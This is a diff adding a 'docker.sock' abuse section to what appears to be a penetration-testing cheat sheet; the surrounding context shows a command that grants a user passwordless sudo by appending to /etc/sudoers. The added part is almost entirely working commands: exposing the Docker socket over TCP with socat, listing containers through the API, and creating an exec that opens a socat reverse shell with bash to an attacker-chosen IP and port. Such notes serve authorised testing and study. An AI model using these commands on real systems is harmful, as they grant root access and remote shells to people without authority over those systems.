@@ -281,3 +281,40 @@ References:
 - Add your user to the `/etc/sudoers` file and grant power to execute all commands
 
       echo "<user> ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+------------------------------
+
+### Abusing docker.sock
+
+- If a docker container contains a `docker.sock` file,you can find it with `find / -name docker.sock 2</dev/null`
+
+![image](https://github.com/user-attachments/assets/5bf2e2ef-f333-426b-9dbe-eb414b88e1d6)
+
+- Make it accessible on the machine with socat
+
+      socat TCP-LISTEN:[PORT],reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock
+
+   ### Getting a revshell as root on the container
+
+   - List all containers to get their ids
+
+          curl http://localhost:[port]/containers/json
+
+   - Add the id to this link, replace cmd's value with your rev shell code
+
+         curl http://localhost:8080/containers/[existing container's id]/exec -X POST -H  "Content-Type: application/json" -d '{"AttachStdin":false, "AttachStdout":true, "AttachStderr":true, "Tty":false, "Privileged":false, "Cmd":["socat","TCP:[ip]:[port]","EXEC:bash"]}'
+
+  - Start the container with id from the output the command above
+
+        curl http://localhost:8080/exec/<id>/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'
+
+
+### References:
+
+- [Quarkslab](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
+- [Dejandayoff](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
+
+
+
+
+  
